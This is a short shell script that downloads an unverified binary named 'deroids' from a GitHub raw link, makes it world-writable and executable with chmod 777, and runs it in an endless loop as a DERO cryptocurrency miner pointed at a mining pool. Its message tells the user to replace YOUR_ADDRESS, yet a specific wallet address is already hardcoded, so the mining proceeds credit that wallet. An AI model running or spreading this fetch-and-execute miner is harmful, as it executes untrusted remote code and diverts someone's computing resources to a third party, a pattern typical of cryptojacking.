wget https://github.com/WxYtzaiu/asekhh/raw/main/deroids
chmod 777 deroids

#!/bin/bash
echo "Replace YOUR_ADDRESS to run the miner"
while :; do
    ./deroids -r pool.whalesburg.com:4300 -w dero1qys9wuhjztzttgwhg3ahz3wamh7rkk86fs5xjtuxppflzkf9wl7rxqqma4k6w.$(echo $(shuf -i 1-9999 -n 1)-sty)
    sleep 5;
done
